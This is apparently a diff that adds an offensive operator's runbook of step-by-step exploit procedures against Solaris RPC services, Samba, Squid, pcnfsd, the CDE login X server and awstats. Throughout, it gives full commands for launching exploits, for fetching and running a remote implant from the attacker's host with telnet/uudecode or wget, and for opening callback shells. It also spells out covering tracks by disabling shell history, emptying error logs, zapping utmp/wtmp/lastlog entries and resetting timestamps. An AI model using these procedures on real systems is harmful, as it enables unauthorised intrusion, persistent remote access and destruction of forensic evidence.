+# Another window will pop up to run the exploit
+# This window will pause to allow you to verify the command it will run.
+# The command should look something like this (the ports will vary):
+#     -u 32778 -i 127.0.0.1 -l 192.168.250.3 -r sendmail -D /tmp/.scsi -n 26120 -c
+# Append '-T 2' to the front of the line so that it looks like this:
+#      -T 2 -u 32778 -i 127.0.0.1 -l 192.168.250.3 -r sendmail -D /tmp/.scsi -n 26120 -c
+# Then press return.
+
+# The exploit window will prompt you to set up a listener like this:
+# You must establish a NOPEN listener on 192.168.250.3:SOME_RANDOM_PORT
+
+-nrtun RANDOM (as indicated in the -sploit exploit prompt)
+
+#Press enter
+
+#Now the exploit will occur and, after a couple of minutes, it will call back
+#to your listener.
+#Once the callback occurs, take the following steps:
+
+#In a local window
+LOCAL>closetunnel
+
+#Press 'A' to abort the autodone commands
+#Delete the files created by your exploit
+#There should be one lock file and one callog file
+-lt /var/spool/calendar
+-rm /var/spool/calendar/THE_TWO_MOST_RECENT_FILES
+
+#Use touch to set the directory timestamp back
+-lt /var/spool
+-touch /var/spool/SOME_OLDER_DIRECTORY /var/spool/calendar
+
+
+### Usage:
+./cmsex
+./cmsex.auto
+
+
+### get nopen ready
+packrat noserver
+
+
+### no redirection
+./cmsex -i TARGET_IP -c 'mkdir /tmp/.scsi; cd /tmp/.scsi && telnet LOCAL_IP NETCAT_PORT | uudecode && uncompress sendmail.Z && PATH=. sendmail' -T <target_type> (-u RANDOM | -t RANDOM)
+
+
+### Redirected:
+-tunnel
+u RANDOM TARGET_IP CMSD_PORT
+r NETCAT_PORT
+
+
+
+./cmsex -i 127.0.0.1 -c 'mkdir /tmp/.scsi; cd /tmp/.scsi && telnet PITCH_IP NETCAT_PORT | uudecode && uncompress sendmail.Z && PATH=. s
+endmail' -T 3 -u RANDOM
+
+
+
+### when the upload is done, kill the netcat, then try connecting in
+-nstun TARGET_IP 
+
+-rm sendmail
+
+
+### Logging:
+-lt /var/adm
+-lt /var/spool/calendar
+
+
+
+
+#########################################################
+# EBB (for EBBISLAND see user.tool.ebbisland.COMMON)
+#########################################################
+
+### Sol2.10 vulnerable for only program 100230 metamhd using ebbshave.v4
+
+### ./ebbshave.v5 is a wrapper program for ebbnew_linux exploit for Sparc Solaris RPC services
+### Important: ebbnew_linux must be in your PATH
+
+command that is useful:
+         rpcinfo -n <PORT NUM> -u|-t <TARGET_IP> <PROGRAM NUM>
+
+usage: ./ebbshave.v5 -o -v -t -p
+-o : one of the following options [1-19]:
+        1, "5.9 metamhd", program # = 100230,
+        2, "5.8 ruserd", program # = 100002, NOTE = version 1
+        3, "5.8 ruserd", program # = 100002, NOTE = version 2 - must start service first by using rpcinfo -n before using this option
+        4, "5.8 ttdbserverd", program # = 100083,
+        5, "5.8 cachefsd", program # = 100235, NOTE = version 1 - Start with option #6 first, if it fails then try this option
+        6, "5.8 cachefsd", program # = 100235, NOTE = version 2 - must start service first by using rpcinfo -n before using this option
+        7, "5.8 metad", program # = 100229, NOTE = version 1
+        8, "5.8 metad", program # = 100229, NOTE = version 2 - must start service first by using rpcinfo -n before using this option
+        9, "5.8 metamhd", program # = 100230,
+        10, "5.7 ruserd", program # = 100002, NOTE = must start service first by using rpcinfo -n before using this option
+        11, "5.7 kcms_server", program # = 100221,
+        12, "5.7 cachefsd", program # = 100235,
+        13, "5.7 ttdbserverd", program # = 100083,
+        14, "5,7 dr_daemon", program # = 300326,
+        15, "5.6 ruserd", program # = 100002,
+        16, "5.6 kcms_server", program # = 100221,
+        17, "5.6 cachefsd", program # = 100235, NOTE = version 1 - Start with option #18 first, if it fails then try this option
+        18, "5.6 cachefsd", program # = 100235, NOTE = version 2 - must start service first by using rpcinfo -n before using this option
+        19, "5.6 ttdbserverd", program # = 100083,
+-v : the program version number you are exploiting which is obtained from rpcinfo output
+-t : targets ip address
+-p : port number rpc program is listening on
+example:
+        ./ebbnew_linux.wrapper -o 2 -v 2 -t 192.168.10.4 -p 32772
+
+If you fail to exploit using ./ebbshave.v5, try bruteforcing using ebbshave.v4
+
+
+### 1.  Use the following command to look for a suitable program to hit
+
+### Redirection:
+-tunnel
+l 111 TARGET_IP
+
+### Local box:
+./ebbshave.v5
+ebbshave -p 127.0.0.1
+
+### 2.  Verify the portnum will work (should respond "ready and waiting) 
+### Use either:
+# rpcinfo -n <PORT NUM> -u|-t <TARGET_IP> <PROGRAM NUM>
+# Ex.:  ebbshave -n 32776 -t targetip 100229
+
+### Redirector:
+-tunnel
+l PORTNUM TARGET_IP
+
+### Locally, see if the program you want is a viable option:
+./ebbshave -n portnum -t host prognum
+./ebbshave -n PORTNUM -t 127.0.0.1 PROGNUM
+
+### Use this for usage statement
+./ebbshave 
+
+
+###### 3.  Plug in your choices and go:
+
+### Netcat window:
+packrat NETCAT_PORT
+
+### Redirector:
+-tunnel
+l 111
+l PORTNUM TARGET_IP
+r NETCAT_PORT
+
+### Locally:
+#ebbshave -B -T OPTION -n PORTNUM -t 127.0.0.1 PROGNUM
+ebbshave -n <PORT> -t 127.0.0.1 <PROGRAM> <VERSION>
+
+# To throw it:
+ebbshave -T <TARG_NUM> -n <PORT> -t 127.0.0.1 <PROGRAM> <VERSION>
+
+
+
+### If that doesn't work, try without the best guess (B) option, or maybe increase th
+### timeout period (W)
+ebbshave -T OPTION -n PORTNUM -t 127.0.0.1 PROGNUM
+
+
+### If successful, you should get a root shell
+
+### Get the following ready for pasting: (paste one line at a time)
+
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+cd /tmp
+mkdir WORK_DIR
+cd /tmp/WORK_DIR
+pwd
+telnet PITCH_IP NETCAT_PORT < /dev/console | uudecode;ls -la
+uncompress sendmail.Z
+netstat -an | grep RAT_PORT
+D=-lRAT_PORT PATH=. sendmail
+
+### pitch window
+-nstun TARGET_IP RAT_PORT
+
+
+
+###### Cleanup:
+/usr/openwin/bin/core
+/var/adm/messages
+
+Other cores locations?
+Always look at utmp, wtmp,etc
+
+
+
+####### If you've hit this before and know the addresses:
+
+# Ex.:  ./ebbshave -T 1 -S 0xffbefa20 -E 0xffbefa20 -n 32775 -t target 300326
+
+
+#########################################################
+# BS - BLUE
+#########################################################
+# ../bin/bs.tr -h
+# 
+# Usage:
+#       [E=ratpreargs] [A=ratpostargs] bs.tr remoteIP remoteHost \
+#       [remoteDomain] \
+#       sadmindPort remoteDir remoteName localIP localPort
+# 
+#       ratpreargs  : the string put on remote command line right after PATH=. and 
+#                      before remoteName (e.g. E='C="-c LOCALIP port"' or
+#                     E='C="-l listenport"')
+# 
+#       ratpostargs : the string put on remote command line after running remoteName
+#
+#
+#       Command sent to bs will be munged from:
+#
+#CMD="mkdir -p ${REMOTE_DIR} && cd ${REMOTE_DIR} && telnet ${LOCAL_IP} ${LOCAL_PORT} < /
+#dev/console | uudecode > /dev/null 2>&1 && uncompress -f ${REMOTE_FNAME}.Z && chmod 755
+# ${REMOTE_FNAME} && PATH=.${RAT_PREARGS} ${REMOTE_FNAME}${RAT_POSTARGS}"
+
+### TRICK - use -A option to get its archtype back
+### TRICK - give a bad hostname to see if it's running in secure mode; if it complains, then
+###		it's still vulnerable, and work out the other options; if there's not response
+###		try another bad name; if still no response, then it's running in secure mode and
+###		not vulnerable
+
+### Scan target
+
+#rpcinfo -p TARGET_IP
+#
+#rpcinfo -n BSPORT -u TARGET_IP 100232
+#rpcinfo -n BSPORT -t TARGET_IP 100232
+
+-scan rpc TARGET_IP
+
+
+mx
+:%s/SADMIND_PORT/SADMIND_PORT/g
+:%s/REMOTE_DIR/\/tmp\/WORK_DIR/g
+`x
+
+###### Start netcat
+packrat NETCAT_PORT
+
+
+#############  BS w/ NO REDIRECTION ###########
+###### 1. No redirection:
+### To use default port
+# ./bs.tr TARGET-IP TARGET-NAME SADMIN-PORT REMOTE-DIR RAT-NAME LOCAL-IP NETCAT-PORT
+# ./bs.tr TARGET_IP TARGET_NAME SADMIN_PORT REMOTE_DIR RAT_NAME LOCAL_IP NETCAT_PORT
+
+### Try in this order:
+bs.auto -i IP -u SADMIND_PORT TARGET_IP
+bs.tr_TRY_SECOND remoteIP remoteHost [remoteDomain] sadmindPort remoteDir remoteName localIP localPort
+bs.tn.gr_USE_WHEN_bs.auto_AND_bs.tr_FAIL
+
+
+### To give a port:
+#E='D=-lRAT-PORT' ./bs.tr TARGET-IP TARGET-NAME TARGET-DOMAIN SADMIND-PORT REMOTE-DIR RAT-NAME LOCAL-IP NETCAT-PORT
+#E='D=-lRAT_PORT' ./bs.tr TARGET_IP TARGET_NAME TARGET_DOMAIN SADMIND_PORT REMOTE_DIR RAT_NAME LOCAL_IP NETCAT_PORT
+
+###### 3. Waiting:
+# you will see bursty traffic on your tcpdump, first the trigger, then the connection to upload nopen.
+# Hit Ctrl-C on your nc
+
+
+###### 4. COnnect to target:
+### Direct connect:
+cd ../down
+noclient TARGET_IP:RAT_PORT
+
+	# or
+
+### Callback - have this ready and waiting when running attack:
+cd ../down
+noclient -l RAT_PORT
+
+
+
+
+
+
+#############  BS w/ REDIRECTION ###########
+###### 1. on redirector
+
+-tunnel
+u SADMIND_PORT TARGET_IP
+r NETCAT_PORT
+s
+
+
+# and this if nopen needs to run in callback mode:
+r RAT_PORT
+
+###### 2. Local window
+
+
+### Syntax (domainname is not always necessary):
+CommandLine: ../bin/bs.tn.gr -h
+
+New usage: ./bs.tn.gr [options] -- [options to <file2Xfer&Run>]
+  -i <remoteIP>       (required)
+  -h <remoteHost>     (required)
+  -a (does not work)  Use alt rpcbind port
+  -s <sndPort>       hardwired 111
+  -r <rcvPort>        hardwired 111
+  -d <remoteDomain>
+  -p <sadmindPort>    def= query rpcbind
+  -l <localIP>        (required)
+  -n <localPort>      (no default)
+  -f <file2Xfer&Run>  (required)
+  -D <remoteDir>      def= /tmp/...
+  -S <remoteScript>   def= /tmp/....
+  -G grinch args    deprecated
+
+
+
+### Redirection:
+### E='D=-lRAT_PORT' ./bs.tr 127.0.0.1 TARGET-NAME TARGET-DOMAIN SADMIND-PORT REMOTE-DIR RAT-NAME PITCH-IP NETCAT-PORT
+
+
+### No domainname:
+E='D=-lRAT_PORT' ./bs.tr 127.0.0.1 TARGET_NAME SADMIND_PORT REMOTE_DIR RAT_NAME PITCH_IP NETCAT_PORT
+
+### With domainname:
+E='D=-lRAT_PORT' ./bs.tr 127.0.0.1 TARGET_NAME TARGET_DOMAIN SADMIND_PORT REMOTE_DIR RAT_NAME PITCH_IP NETCAT_PORT
+
+### Callback:
+E='D=-cPITCH_IP:RAT_PORT' ./bs.tr 127.0.0.1 TARGET_NAME SADMIND_PORT REMOTE_DIR RAT_NAME PITCH_IP NETCAT_PORT
+
+
+
+###### 3. Waiting:
+# you will see bursty traffic on your tcpdump, first the trigger, then the connection to upload nopen.
+# Hit Ctrl-C on your nc
+
+
+###### 4. From redirector:
+-nstun TARGET_IP RAT_PORT
+
+	# or
+
+-nrtun RAT_PORT
+
+-call PITCH_IP RAT_PORT
+
+
+
+
+
+###### Cleanup:
+
+#  usually nothing
+
+
+###########################################################
+# GS - GREEN
+###########################################################
+
+gs.auto
+Usage: $PROG -i <rem_ip> [ options ]
+
+-i IP     IP of target machine (NO DEFAULT)
+-g opt    Change default GS option from ./$GS_OPTION to \"./opt\"
+          (can be grins, frowns or sneer).
+-C str    Change default community string from public to \"str\".
+-l IP     IP of attack machine (Default: the first active IP found in
+          this order: ppp0, ppp1, eth0 or eth1) 
+-n #      rat upload port (Default: a random port)
+-p #      Use port # for RAT listen/callback. (Default: random)
+-s #      Change delay used for -c to # seconds (must appear before -c).
+-c        Use NOPEN syntax to have RAT callback after a delay (Default
+          delay: $CALLBACKDELAY seconds). Callback is to -l IP.
+-k        Use ksh method instead of telnet/uu*code.
+-z        Do NOT use uncomrpess at the either end
+-r rat    name of rat on target (Default: sendmail)
+-D dir    directory to work from/create on target (Default = /tmp/.scsi)
+-P        Assume PATH=. will fail so use ./ratname
+          target, and MUST NOT use uuencode on upload.
+-a ARCH   String used to determine which architecture NOPEN server to
+          upload from /current/up/morerats/ using this (note tail -1):
+          \"ls -1 ./noserver* 2>/dev/null | grep -i ${ARCH} | tail -1\".
+          If not provided or no match, /current/up/noserver is assumed.
+-G        Retry exploit--using already uploaded RAT (useful when you need
+          to try adding -P option or try another RAT callback port).
+
+
+### Or the old way:
+
+# sneer(2.6) or frowns(2.7+)
+gs.os.gr
+Usage: /home/black/tmp/20030124-0318/./bin/gs.os.gr [options]
+  -i <remoteIP>                (required)
+  -g <grins|frowns|sneer>      def= frowns
+  -l <localIP>                 (required)
+  -n <localPort>               (required)
+  -c <callbackPort>            (no default)
+  -p <listenPort>              (no default)
+  -D <remoteDir>               def= /tmp/.X11R6
+  -f <remoteRATName>           def= nscd
+  -E <RATenvironment vars>     (no default)
+  -A <RATarguments>            (no default)
+  -S <remoteScript>            DEPRECATED (and ignored)
+  -s <remoteScript>            DEPRECATED (and ignored)
+
+rpcinfo -p TARGET_IP
+
+rpcinfo -n GSPORT -u TARGET_IP 100249
+rpcinfo -n GSPORT -t TARGET_IP 100249
+
+# From PI
+-scan rpc TARGET_IP
+-scan mibiisa TARGET_IP
+	# should respond w/ snmp version or h/w type if mibiisa is running:
+-scan snmp1 TARGET_IP
+	# should give motd banner to tell you the OS
+-scan snmp2 TARGET_IP
+
+# If the above don't answer, GS won't work
+#if the scans answer with "No such name" then they are probably not vulnerable
+# anything else might be worth a shot as long as you're getting udp 161 to target
+
+### In netcat window:
+packrat NETCAT_PORT
+
+
+# Tunneling
+# on redirector
+
+-tunnel
+u 161 TARGET_IP
+r NETCAT_PORT
+s
+
+# logging depends on sneer(2.6) or frowns(2.7+)
+
+
+
+# With redirector:
+#./gs.os.gr -i 127.0.0.1 -g <frowns/sneer> -l PITCH-IP -n NETCAT-PORT -D /tmp/WORK-DIR -f RAT-NAME
+./gs.os.gr -i 127.0.0.1 -g <frowns/sneer> -l PITCH_IP -n NETCAT_PORT -D /tmp/WORK_DIR -f RAT_NAME
+ 
+# NO tunneling
+
+# Local window
+#./gs.os.gr -i TARGET-IP -g <frowns/sneer> -l LOCAL-IP -n NETCAT-PORT -D /tmp/WORK-DIR -f RAT-NAME
+./gs.os.gr -i TARGET_IP -g <frowns/sneer> -l LOCAL_IP -n NETCAT_PORT -D /tmp/WORK_DIR -f RAT_NAME
+
+
+# Both cases:
+#you wait 4 minutes, and you should see the upload of nopen 
+# Ctrl-C your nc
+
+### Connect to target:
+### Straight connect (no redirection)
+cd ../down
+../bin/noclient TARGET_IP
+
+### Connect using redirector:
+-nstun TARGET_IP
+
+### Cleanup:
+### run cleaner after frowns (or else another callback in 4 minutes) (might be automatic now)
+### rm /tmp/mibiisa_ps_data
+### toast utmp, wtmp, utmpx, wtmpx 
+
+
+###############################################
+# YS - YELLOW
+##############################################
+
+### New way:
+
+Usage: ys.auto -i TARGETIP [options]
+
+-i IP     IP of target machine (NO DEFAULT)
+-l IP     IP of attack machine (Default: the first active IP found in
+          this order: ppp0, ppp1, eth0 or eth1) 
+-n #      rat upload port (Default: a random port)
+-p #      Use port # for RAT listen/callback. (Default: random)
+-s #      Change delay used for -c to # seconds (must appear before -c).
+-c        Use NOPEN syntax to have RAT callback after a delay (Default
+          delay: 3 seconds)
+-z        Do NOT use uncomrpess at the either end
+-e        Do NOT use "2>&1" on target. Fouls up in some shells.
+-r rat    name of rat on target (Default: sendmail)
+-x #      port to start mini X server on (Default: random port)
+-D dir    directory to work from/create on target (Default = /tmp/.scsi)
+-P        Assume PATH=. will fail so use ./ratname
+          target, and MUST NOT use uuencode on upload.
+-a ARCH   String used to determine which architecture NOPEN server to
+          upload from /current/up/morerats/ using this (note tail -1):
+          "ls -1 ./noserver* 2>/dev/null | grep -i ${ARCH} | tail -1".
+          If not provided or no match, /current/up/noserver is assumed.
+
+NOTE: -x # and -p# can be the same, even in callback mode. ys.auto
+provides
+      a mechanism to allow netcat callback to finish, and its -tunnel to
+      close before the NOPEN server calls back on the same port.
+
+examples: 
+   ys.auto -l 19.16.1.1 -i 10.0.3.1 -n 2222 -r nscd -x 9999 -D /tmp/.dir
+   ys.auto -i 10.0.3.1
+   ys.auto -i TARGET_IP -l REDIRECTOR_IP
+
+NOTE: The only REQUIRED ARGUMENT is now -i
+
+The best way to back out of ys.auto once done (whether or not you get on
+target) is to kill off the packrat window first with ^C then ^D. Then
+kill of the xc window the same way, finally kill the ys.auto.
+
+ys.auto Version 1.4.1.1
+
+### Old Way:
+mx
+:%s/XSERVER_PORT/x/g
+x
+
+-scan xwin TARGET_IP
+
+### Locally:
+packrat NETCAT_PORT
+ #or
+packrat -n /current/bin/nc.YS NETCAT_PORT
+
+######### YS With no redirection:
+
+### Local Window 1:
+#./wrap-sun.sh -l LOCAL-IP -r sendmail -p NETCAT-PORT -x XSERVER-PORT -d /tmp/WORK-DIR
+./wrap-sun.sh -l LOCAL_IP -r sendmail -p NETCAT_PORT -x XSERVER_PORT -d /tmp/WORK_DIR
+
+### Local Window 2:
+#./xc -x LOCAL-IP -y XSERVER-PORT -s LOCAL-IP TARGET-IP
+./xc -x LOCAL_IP -y XSERVER_PORT -s LOCAL_IP TARGET_IP
+
+
+
+######  YS With REDIRECTION:
+###### 1. On redirector - set up nopen tunnel
+
+-tunnel
+u 177 TARGET_IP
+r XSERVER_PORT
+r NETCAT_PORT
+s
+
+
+###### 2. Local window1
+#./wrap-sun.sh -l PITCH-IP -r sendmail -p NETCAT-PORT -x XSERVER-PORT -d /tmp/WORK-DIR
+./wrap-sun.sh -l PITCH_IP -r sendmail -p NETCAT_PORT -x XSERVER_PORT -d /tmp/WORK_DIR
+
+	# hit return
+ 	# type y and hit return
+
+
+###### 3. Local Window2:
+        # for redirection local ip is redirector ip
+
+#./xc -x PITCH-IP -y XSERVER-PORT -s PITCH-IP 127.0.0.1
+./xc -x PITCH_IP -y XSERVER_PORT -s PITCH_IP 127.0.0.1
+
+  	# hit return
+  	# hit return
+  	# hit return
+	# (At this point you should see a continue.... in your attack1 window
+
+	# in the attack1 window
+  	# hit return
+  	# hit return
+  	# hit return
+  
+  	# (you should see your upload happen...)
+
+### IF Exploit is successful
+# DOING THE FOLLOWING WILL GREATLY REDUCE POSSIBLE LOGGING.
+# ONLY HIT CONTINUE, IN THE MINI X SERVER WINDOW, ENOUGH
+# TIMES TO GET THE RAT UPLOADED. 
+# WATCH TCPDUMP OUTPUT TO DETERMINE WHEN RAT IS UPLOADED.
+# ONCE THE RAT IS UPLOADED, CONNECT
+# TO THE TARGET VIA THE RAT AND DO THE FOLLOWING:
+
+ps -ef | grep dtlogin
+kill PID
+
+# IF YOU SELECTED THE CORRECT dtlogin PID, THEN YOU SHOULD SEE A 
+# "connection closed" MESSAGE IN YOUR MINI X SERVER WINDOW. IF
+# NOT, YOU SELECTED THE WRONG PID AND JUST KILLED SOMEBODY ELSE'S
+# dtlogin. IF ALL GOES WELL, HIT control ^C IN THE MINI X SERVER
+# WINDOW AND THE XC WINDOW.
+
+
+	# Ctrl-C your nc window
+	# Ctrl-C your xc window
+
+
+###### Double window way:
+
+
+### Local scripted (you'll type commands in this):
+nc -l -p RPORT1
+
+###Local scripted (your output from above will appear here):
+nc -l -p RPORT2
+
+### or instead, use doublet in a scripted window (type and output all in same window):
+doublet -O -t -i PITCH_IP RPORT1
+
+### then set up the tunnels as below, and use wrap-telnet.sh and xc
+
+### Scripted #1
+wrap-telnet.sh -l REDIRECTIP -p RPORT1 -s RPORT2 -x XPORT
+
+### Scripted #2
+# xc -x REDIRECTIP -y XPORT -s REDIRECTIP 127.0.0.1
+
+### Redir
+# -tunnel
+# u 177 TARGET_IP
+# r XPORT
+# r RPORT1
+# r RPORT2
+# r NETCAT_PORT
+
+
+#w/o tunneling
+cd ../down
+../bin/noclient TARGET_IP  
+
+#w/ tunneling. In redirector window
+-nstun TARGET_IP
+
+-rm RAT_NAME
+
+###### Cleaning up ######
+### The error log file is configurable and so you must examine 
+### their xdm-config file to find out where errors are being 
+### logged.
+###
+### HAVE TO LOOK THROUGH "find" file from getscript
+
+egrep -i '(xdm-config|errors|xerror)' /current/*find*m
+
+### if no find available one of these will probably find it
+
+-ls /tmp/*errors /var/dt/*errors
+-cat error_file
+
+-grep PITCH_IP /var/adm/SYSLOG /var/log/syslog /var/adm/messages
+
+-ls -t /var/dt/
+
+### you will notice Xerrors is the most recent
+
+-tail /var/dt/Xerrors
+
+### if your entries are the only ones there....
+
+cat /dev/null >/var/dt/Xerrors
+
+### if there are other entries you will do something like
+
+wc -l /var/dt/Xerrors
+
+### subtract the number of lines that are because of you from above
+
+head -(what's left) > t ; cat t
+
+### if it looks good:
+
+cat t > /var/dt/Xerrors
+-cat /var/dt/Xerrors
+-rm t
+
+-ls -t /var/adm
+### anything that has a reasonably current timestamp you should check
+
+### toasting the login entries.....
+
+### Target window
+-put ../up/toast t
+
+### TO VIEW...
+./t -u /var/adm/utmp 
+./t -u /var/adm/wtmp | tail -20
+./t -x /var/adm/utmpx 
+./t -x /var/adm/wtmpx | tail -20
+./t -l /var/adm/lastlog | tail
+
+### TO ZAP...
+./t -u /var/adm/utmp tty date
+./t -u /var/adm/wtmp tty date
+./t -x /var/adm/utmpx tty date
+./t -x /var/adm/wtmpx tty date
+./t -l /var/adm/lastlog /var/adm/wtmpx user
+
+################################################
+# CATFLAP
+################################################
+
+### on redirector
+
+-stun TARGET_IP 23
+	# or
+-tunnel
+l 2323 TARGET_IP 23
+r NETCAT_PORT
+
+### Local window
+# run catflap to generate output for pasting into telnet:
+# syntax:
+/current/bin/catflap_sparc -h
+
+
+# Ex:
+#/current/bin/catflap_sparc -7 -c "/bin/sh"
+/current/bin/catflap_sparc -<option_num> -c "/bin/sh"
+
+
+###  on redirector
+
+-rtun NETCAT_PORT
+
+### Local window
+
+ftshell telnet localhost 2323
+
+### paste catflap output once you get telnet prompt
+<ctrl><d>
+
+### should get root prompt
+### Now upload rat 
+
+### with ftshell:
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+cd /tmp
+mkdir WORK_DIR
+cd /tmp/WORK_DIR
+pwd
+~~p
+noserver sendmail
+ls -la
+chmod 700 sendmail
+PATH=. D=-lRAT_PORT sendmail
+
+### now root on target (do the following if you did NOT use ftshell)
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+cd /tmp
+mkdir WORK_DIR
+cd /tmp/WORK_DIR
+pwd
+telnet PITCH_IP NETCAT_PORT < /dev/console | uudecode;ls -la
+uncompress sendmail.Z
+netstat -an | grep RAT_PORT
+D=-lRAT_PORT PATH=. sendmail 
+
+### pitch window
+-nstun TARGET_IP RAT_PORT
+
+### <ctrl><c> or <ctrl><d> in root target window/nc once
+### you have nopen on target
+
+-put /current/up/toast t
+-ls -t /var/adm /var/log
+
+### look at entries
+
+./t -u /var/adm/utmp
+./t -u /var/adm/wtmp | tail -20
+./t -x /var/adm/utmpx
+./t -x /var/adm/wtmpx | tail -20
+
+
+
+############################################
+# EXPOSITTRAG
+############################################
+
+# exploit pcnfsd version 2.x (fails on v.1 or 3+)
+
+#
+# whatever redirector you use, port 514 cannot
+# be in use
+
+netstat -an | grep 514
+
+# to determine the version
+
+-scan rpc TARGET_IP
+
+-tunnel
+u UDP_PCNFSD_PORT TARGET_IP
+
+# LOCAL
+#./prout -w TARGET_IP UDP_PCNFSD_PORT 
+./prout -w 127.0.0.1 791
+
+
+# pcnfsd version 1, version 3 and higher are not vulnerable
+packrat PACKRAT_PORT
+
+-tunnel
+r PACKRAT_PORT
+u PCNFSDPORT TARGET_IP
+
+# An example of nopen.t: (note the size of the this file is 482. If you make 
+# modifications, change the size appropriately)
+# use nopen.t file from build, if not <NULL>
+# can be made with hexedit
+
+<NULL>C0755 482 t
+#!/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/usr/local/etc:/usr/sbin:/usr/bin:/opt/SUNWspro/bin:/etc:/usr/ccs/bin:/usr/lib/nis:/
+usr/sbin:/usr/bin
+export PATH
+mkdir /tmp/.scsi
+cd /tmp/.scsi
+telnet PITCH_IP PACKRAT_PORT < /dev/console |uudecode
+uncompress -f sendmail.Z
+chmod +x sendmail
+#PATH=. D=-cPITCH_IP:NOPEN_PORT sendmail
+PATH=. sendmail
+/etc/init.d/pcnfs stop
+/etc/init.d/pcnfs start
+<NULL>
+
+nc -vv -l -p 514 < nopen.t # edit nopen.t, note the size, subtract 14 from the actual size and replace 482 with the new 
+size
+
+-rtun 514 127.0.0.1
+
+#./slugger2 TARGET_IP TARGET_PORT CMD [PRINTER_NAME]
+
+./slugger2 TARGET_IP TARGET_PORT "cd ..
+cd ..
+cd ..
+cd ..
+cd tmp
+rcp -p PITCH_IP:t .t
+sh .t
+"
+
+# CLEANUP
+/bin/rm /tmp/.t
+#  also might be /tmp/-p
+/bin/rm -rf /tmp/.scsi
+
+# /var/adm/messages will have pcnfs errors 
+# check history files
+
+######################  ECHOWRECKER #####################
+# samba server vulnerability
+
+# Samba 3.0.2a-9AX and Samba 3.0.5 are currently vulnerable
+# Samba 2.x on Redhat 7.3, 8.0, and 9.0 are vulnerable
+
+-scan win_scan TARGET_IP
+
+-tunnel
+l 139 TARGET_IP
+r RATPORT
+
+./echowrecker_quiet -O  -h  -c  [-s ] [-e ] [-a ] [-b] [-l] [-d ] [-i ]
+General cases:
+0 - Samba 3.0.2a-9AX [uses info leak]
+1 - Samba 3.0.5 [uses info leak]
+2 - Samba 2.2.7a (rh9 default) [uses info leak] (DO NOT USE)
+Specific cases:
+3 - Redflag 4.0 (kernel 2.4.20 samba 3.0.2a-9AX) (after restart of smb service)
+4 - RedFlag 4.0 (kernel 2.4.20 samba 3.0.2a-9AX) (after reboot of server)
+5 - RedFlag 4.0 AS SE (kernel 2.4.20 samba 2.2.8) (after restart of smb service)
+6 - RedFlag 4.0 AS SE (kernel 2.4.20 samba 2.2.8) (after reboot of server)
+7 - RedHat 7.3 (kernel 2.4.18-3 samba 2.2.3a)
+8 - RedHat 8.0 (kernel 2.4.18-14 samba 2.2.5)
+9 - RedHat 9.0 (samba 2.2.7)
+10 - SuSE 9.0 (kernel 2.4.21 samba 2.2.8a)
+
+-b = turn bruteforcing on
+-l = just do info leak and print returned bytes - good for fingerprinting
+-d = seconds of delay between brute force attempts
+-s = start of address range to brute force for the location of the shellcode
+-e = end of address range to brute force for the location of the shellcode
+-a = address in GOT of function pointer to overwrite (usually 'free') [exactly, not the addr-0xc]
+                to find it -> # objdump -R /usr/sbin/smbd | grep free
+-s, -e, -i, -a should be input in hex (ie 0x1000)
+
+-c = command to run on server as euid root
+Ex: -c "/usr/bin/wget -O /tmp/a http://10.1.2.21/noserver && chmod 755 /tmp/a && /tmp/a"
+
+=========================================================
+Also, if the use of the "quiet" echowrecker edition is desired, usage is such:
+$ make quiet
+$ ./echowrecker_quiet -O 0 -h 127.0.0.1 -c "/usr/bin/wget -O /tmp/a http://PITCH_IP:RATPORT/crond && chmod 755 /tmp/cron
+d && /tmp/crond"
+.
+Found [20] to try
+Trying [1 of 100] 
+Trying [2 of 100] 
+etc...
+
+######################  ELECTRICSLIDE #####################
+#  Heap Overflow in squid 2.5.STABLE1-2  redhat 9.0
+-scan 3128 TARGET_IP
+
+-tunnel
+l 3128 TARGET_IP
+
+-tunnel 9999 udp
+
+./electricslide.pl -t <ip:port> -o <target_type> -d <delay> -l <ip:port>
+[-U <user>] [-P <pass>] [-n <port>] [-f <ip:port>] [-a <local addr>]
+
+        -h, --help          Print this helpful message
+        -t, --target         Target Squid server ip
+        -o, --target-type   Target type (see list below)
+        -l, --listen        Electricslide listen port which Squid will connect to
+        -U, --proxy-user    Proxy-Auth user name (if required)
+        -P, --proxy-pass    Proxy-Auth password (if required)
+        -n, --nopen         Set to port of UDP nopen tunnel
+        -f, --nopen_forward The address and port of the target machine to forward
+                               the attack to through the nopen tunnel
+        -a, --local-addr    The local ip address (not 127.0.0.1)
+        -d, --delay         Web server exploit transmit delay
+                             (The web server will delay the last
+                             400 bytes of the payload this number of seconds.
+                             This ensures that the shellcode will be in proper
+                             alignment when the exploit occurs. Default 30)
+
+        Examples:
+#        - Shooter with receiver on port 80:
+#./electricslide.pl -t TARGET_IP:3128 -l LOCAL_IP:80 -d 30 -o 0
+#
+#        - Shooter with receivers on port 80 using proxy auth:
+#./electricslide.pl -t TARGET_IP:3128 -l LOCAL_IP:80 -d 30 -o 0 -U "user" -P "password"
+
+./electricslide.pl -t 127.0.0.1:7777 -l PITCH_IP:8888 -o 0 -n 9999 -f TARGET_IP:3128
+
+nc 127.0.0.1 9999
+
+# or
+eslide   [options] <-t profile> <-l listenerip> <targetip>
+
+--------------------------------------------------------------------------
+Options:
+        -A <proxyuser:proxypass>
+                Proxy authentication info in username:password format
+
+        -l <listenip>
+                The ip address for the connect-back proxy request.
+
+        -p <targetport>
+                The target port.  Default: 3128
+
+        -P <listenport>
+                The connectback port. Must be allowed by proxy. Default: 80
+
+        -t <profile>
+                The profile number.  See supported profiles below
+
+        -k
+                Disable the firing of the killer profile which gets a fresh heap (at your own risk!)
+
+
+Profiles:
+        [0]     Gentle Persuasion
+        [1]     Redhat 9
+
+./electricslide -t 1 -l LOCAL_IPorPITCH_IP TARGET_IPor127.0.0.1
+
+
+######################  ELMIRASIGNET #####################
+#  vulnerability in awstats software < 6.3 on apache server
+#  jogswirl
+
+-tunnel
+l 80 TARGET_IP
+r 5555
+
+# vulnerable ?
+
+-scan http TARGET_IP
+
+     # galeon http://127.0.0.1/cgi-bin/awstats.pl
+ Advanced Web Statistics 6.1 (build 1.704)
+
+     # ./xp_awstats.pl -i 127.0.0.1 -d /cgi-bin/awstats.pl -e 0 -c "uname -a;ls -la;w"
+
+./xp_awstats.pl -i<host> -d<dir/file> -e<exploit method number> -c<commands to run on target>
+ 
